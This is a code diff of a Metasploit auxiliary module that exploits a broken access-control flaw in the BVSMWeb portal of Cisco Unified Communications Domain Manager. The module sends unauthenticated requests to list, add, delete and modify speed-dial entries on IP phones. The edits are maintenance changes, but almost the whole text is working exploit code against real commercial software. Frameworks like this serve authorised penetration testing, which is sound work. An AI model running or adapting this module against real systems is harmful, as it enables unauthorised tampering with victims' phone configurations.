@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
@@ -17,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
         The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
         (CDM), before version 10, doesn't implement access control properly, which allows remote
         attackers to modify user information. This module exploits the vulnerability to make
-        unauthorized speeddial entity manipulations.
+        unauthorized speed dial entity manipulations.
       },
       'Author'        => 'fozavci',
       'References'    =>
@@ -43,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
       OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
       OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),
-    ], self.class)
+    ])
   end
 
   def run
@@ -73,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.code == 200 && res.body && res.body.to_s =~ /Speed [D|d]ial/
       return Exploit::CheckCode::Vulnerable, res
     else
-      print_error("#{peer} - Target appears not vulnerable!")
+      print_error("Target appears not vulnerable!")
       return Exploit::CheckCode::Safe, res
     end
   end
@@ -98,17 +96,17 @@ class Metasploit3 < Msf::Auxiliary
         info << "Name: #{names[i].split(":")[1]}, "
         info << "Telephone: #{phones[i]}"
 
-        print_good("#{peer} - #{info}")
+        print_good("#{info}")
       end
     else
-      print_status("#{peer} - No Speed Dial detected")
+      print_status("No Speed Dial detected")
     end
   end
 
   def list
     mac = datastore['MAC']
 
-    print_status("#{peer} - Getting Speed Dials of the IP phone")
+    print_status("Getting Speed Dials of the IP phone")
     vars_get = {
       'device' => "SEP#{mac}"
     }
@@ -123,7 +121,7 @@ class Metasploit3 < Msf::Auxiliary
     position = datastore['POSITION']
     telno = datastore['TELNO']
 
-    print_status("#{peer} - Adding Speed Dial to the IP phone")
+    print_status("Adding Speed Dial to the IP phone")
     vars_get = {
       'name' => "#{name}",
       'telno' => "#{telno}",
@@ -134,11 +132,11 @@ class Metasploit3 < Msf::Auxiliary
     status, res = send_rcv('phonespeedialadd.cgi', vars_get)
 
     if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
-      print_good("#{peer} - Speed Dial #{position} is added successfully")
+      print_good("Speed Dial #{position} is added successfully")
     elsif res && res.body && res.body.to_s =~ /exist/
-      print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
+      print_error("Speed Dial is exist, change the position or choose modify!")
     else
-      print_error("#{peer} - Speed Dial couldn't add!")
+      print_error("Speed Dial couldn't add!")
     end
   end
 
@@ -146,7 +144,7 @@ class Metasploit3 < Msf::Auxiliary
     mac = datastore['MAC']
     position = datastore['POSITION']
 
-    print_status("#{peer} - Deleting Speed Dial of the IP phone")
+    print_status("Deleting Speed Dial of the IP phone")
 
     vars_get = {
       'entry' => "#{position}",
@@ -156,9 +154,9 @@ class Metasploit3 < Msf::Auxiliary
     status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
 
     if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
-      print_good("#{peer} - Speed Dial #{position} is deleted successfully")
+      print_good("Speed Dial #{position} is deleted successfully")
     else
-      print_error("#{peer} - Speed Dial is not found!")
+      print_error("Speed Dial is not found!")
     end
   end
 
@@ -168,7 +166,7 @@ class Metasploit3 < Msf::Auxiliary
     position = datastore['POSITION']
     telno = datastore['TELNO']
 
-    print_status("#{peer} - Deleting Speed Dial of the IP phone")
+    print_status("Deleting Speed Dial of the IP phone")
 
     vars_get = {
       'entry' => "#{position}",
@@ -178,8 +176,8 @@ class Metasploit3 < Msf::Auxiliary
     status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
 
     if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
-      print_good("#{peer} - Speed Dial #{position} is deleted successfully")
-      print_status("#{peer} - Adding Speed Dial to the IP phone")
+      print_good("Speed Dial #{position} is deleted successfully")
+      print_status("Adding Speed Dial to the IP phone")
 
       vars_get = {
         'name' => "#{name}",
@@ -192,14 +190,14 @@ class Metasploit3 < Msf::Auxiliary
       status, res = send_rcv('phonespeedialadd.cgi', vars_get)
 
       if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
-        print_good("#{peer} - Speed Dial #{position} is added successfully")
+        print_good("Speed Dial #{position} is added successfully")
       elsif res && res.body =~ /exist/
-        print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
+        print_error("Speed Dial is exist, change the position or choose modify!")
       else
-        print_error("#{peer} - Speed Dial couldn't add!")
+        print_error("Speed Dial couldn't add!")
       end
     else
-      print_error("#{peer} - Speed Dial is not found!")
+      print_error("Speed Dial is not found!")
     end
   end
 end
